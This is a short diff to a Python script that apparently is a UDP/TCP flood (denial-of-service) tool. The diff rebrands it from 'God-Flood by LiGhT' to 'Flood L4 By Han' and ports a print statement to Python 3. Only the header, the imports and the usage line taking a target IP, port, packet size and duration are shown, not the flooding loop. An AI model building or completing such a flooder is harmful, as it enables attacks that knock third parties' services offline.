@@ -1,9 +1,9 @@
 #!/usr/bin/env python
-# God-Flood by LiGhT
+# Flood L4 By Han
 import socket, random, time, os, sys
 
 if len(sys.argv) < 5:
-        print "God-Flood By LiGhT"
+        print("Flood By Han")
         sys.exit("Usage: python "+sys.argv[0]+" <ip> <port> <size> <time>")
 
 ip = sys.argv[1]
